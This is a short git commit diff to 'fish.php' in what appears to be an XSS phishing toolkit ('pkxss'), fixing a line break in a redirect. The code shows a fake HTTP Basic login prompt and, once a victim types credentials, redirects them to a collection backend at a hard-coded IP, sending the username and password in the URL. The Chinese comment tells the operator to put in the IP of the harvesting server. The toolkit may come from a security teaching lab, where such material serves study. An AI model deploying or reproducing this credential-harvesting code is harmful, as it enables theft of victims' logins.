cb2f3cb893ce7f437e0e8da2b39f2d16dbadd4c1
driftingdream <ezrage2001@outlook.com>
2020-04-15 23:19:11 +0800

    Fix url bug

--- pkxss/xfish/fish.php
+++ pkxss/xfish/fish.php
@@ -10,8 +10,7 @@ if ((!isset($_SERVER['PHP_AUTH_USER'])) || (!isset($_SERVER['PHP_AUTH_PW']))) {
     exit;
 } else if ((isset($_SERVER['PHP_AUTH_USER'])) && (isset($_SERVER['PHP_AUTH_PW']))){
 //将结果发送给搜集信息的后台,请将这里的IP地址修改为管理后台的IP
-    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}
-    &password={$_SERVER[PHP_AUTH_PW]}");
+    header("Location: http://192.168.1.15/pkxss/xfish/xfish.php?username={$_SERVER[PHP_AUTH_USER]}&password={$_SERVER[PHP_AUTH_PW]}");
 }
 
 ?>
